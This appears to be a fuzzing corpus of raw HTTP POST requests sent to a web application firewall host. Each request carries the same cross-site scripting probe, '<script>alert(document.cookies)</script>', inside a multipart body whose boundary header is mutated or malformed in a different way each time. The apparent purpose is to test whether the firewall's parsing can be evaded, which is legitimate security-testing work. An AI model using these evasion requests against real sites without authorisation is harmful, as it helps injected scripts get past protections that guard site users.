POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 829\r\nContent-Type: multipart/form-data; bouKdaryboundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 893\r\nContent-Type: multipart/form-data; boundWryboundryboundarybondarybound^ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 957\r\nContent-Type: multipart/form-data; =bounda-jy=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 62\r\nContent-Type: multipart/form-data; boundarybounaryboEundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 126\r\nContent-Type: multipart/form-data; bou\x14ndryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 190\r\nContent-Type: multipart/form-data; boundaryboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 254\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 318\r\nContent-Type: multipart/form-data; boundarybundaryboundarybound+a-y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 382\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 446\r\nContent-Type: multipart/form-data;  boundarybou$\x17ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 510\r\nContent-Type: multipart/form-data; bunda\x14pyboundar`boun\x0bdaryounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 574\r\nContent-Type: multipart/form-data; boundaYry=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 638\r\nContent-Type: multipart/form-data; bou:ndaryboundaryboundarymound\x13aryboun arybouZdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 702\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 766\r\nContent-Type: multipart/form-data; boun;aryb+undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 830\r\nContent-Type: multipart/form-data; boundary=boun\x7fdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 894\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 958\r\nContent-Type: multipart/form-data; Moundar=boBundar)\x1dy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 60\r\nContent-Type: multipart/form-data; boundarybouQ\x1d|ry=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 124\r\nContent-Type: multipart/form-data; Eboundryoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 188\r\nContent-Type: multipart/form-data; bou\tn&ary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 252\r\nContent-Type: multipart/form-data; budaryboundary=\x10boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 316\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 380\r\nContent-Type: multipart/form-data; boudaFry=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 444\r\nContent-Type: multipart/form-data; boundAa\t=boundaryy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 508\r\nContent-Type: multipart/form-data; bound&ryound\x0bary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 572\r\nContent-Type: multipart/form-data; b\x12unNdaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 636\r\nContent-Type: multipart/form-data; boundY3ry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 700\r\nContent-Type: multipart/form-data; boundary=bKoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 764\r\nContent-Type: multipart/form-data; boundar\x1dyboundarybRu\x03nda5@y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 828\r\nContent-Type: multipart/form-data; boundarybundary=bound5ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 892\r\nContent-Type: multipart/form-data; boudary=bondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 956\r\nContent-Type: multipart/form-data; boundry=bo\x07ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 16\r\nContent-Type: multipart/form-data; boyunda\x1dy=bounar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 80\r\nContent-Type: multipart/form-data; 1bounda/y=boundaryFoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 144\r\nContent-Type: multipart/form-data; boundaryboudaryboun4ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 208\r\nContent-Type: multipart/form-data; =Ibounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 272\r\nContent-Type: multipart/form-data; bounda\x19yboundary=bo\xc2\xabndhry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 336\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 400\r\nContent-Type: multipart/form-data; boun9ary=beundar:;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 464\r\nContent-Type: multipart/form-data; boundory=bounda\'dry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 528\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 592\r\nContent-Type: multipart/form-data; bo\x08undary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 656\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 720\r\nContent-Type: multipart/form-data; boundary==boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 784\r\nContent-Type: multipart/form-data; boun*\x10{ry==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 848\r\nContent-Type: multipart/form-data; \'boundarpbondar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 912\r\nContent-Type: multipart/form-data; boundaryb\\#ndarFy=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 976\r\nContent-Type: multipart/form-data; boundary==%\x00boun\x1fary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 35\r\nContent-Type: multipart/form-data; b.ounSay;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 99\r\nContent-Type: multipart/form-data; ==bxo\x13ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 163\r\nContent-Type: multipart/form-data; =oundary=boXndar8;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 227\r\nContent-Type: multipart/form-data; boludarJyboundary=`oundarh;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 291\r\nContent-Type: multipart/form-data; bo\x02undaryMb1o!undar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 355\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 419\r\nContent-Type: multipart/form-data; boundaryYound\x18?y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 483\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 547\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 611\r\nContent-Type: multipart/form-data; boundGry==o\x03ndanrG;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 675\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 739\r\nContent-Type: multipart/form-data; bowndary=bundarZy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 803\r\nContent-Type: multipart/form-data; boundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 867\r\nContent-Type: multipart/form-data; boundary=boun\x02bry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 931\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 995\r\nContent-Type: multipart/form-data; bou{ndar=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 59\r\nContent-Type: multipart/form-data; boundarybounaary=vboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 123\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 187\r\nContent-Type: multipart/form-data; boJunary=boKundaryboundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 251\r\nContent-Type: multipart/form-data; =bz8oun\x19ar\x1f;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 315\r\nContent-Type: multipart/form-data; boundaryboundary=/onday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 379\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 443\r\nContent-Type: multipart/form-data; boundry=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 507\r\nContent-Type: multipart/form-data; \x11boujRary==bundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 571\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 635\r\nContent-Type: multipart/form-data; bound\x7far#y=bndar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 699\r\nContent-Type: multipart/form-data; =boundarboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 763\r\nContent-Type: multipart/form-data; boun5darybjundarb=oundaly=bL6ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 827\r\nContent-Type: multipart/form-data; C2ound\x1bry=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 891\r\nContent-Type: multipart/form-data; boundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 955\r\nContent-Type: multipart/form-data; &{bounaN\x13\n=[boun\x17ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 57\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 121\r\nContent-Type: multipart/form-data; boundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 185\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 249\r\nContent-Type: multipart/form-data; boundary=b-un~dcy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 313\r\nContent-Type: multipart/form-data; ==bounda\x00ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 377\r\nContent-Type: multipart/form-data; =bo+undary=boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 441\r\nContent-Type: multipart/form-data; bo\xc2\xabundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 505\r\nContent-Type: multipart/form-data; boun+dar=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 569\r\nContent-Type: multipart/form-data; bounarybound)ar\x1d=unay;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 633\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 697\r\nContent-Type: multipart/form-data; bo\x08ndary=bundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 761\r\nContent-Type: multipart/form-data; boundaryboundary=bJouOndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 825\r\nContent-Type: multipart/form-data; boundaryboundary=boun$dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 889\r\nContent-Type: multipart/form-data; bo`ndaryboundaryoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
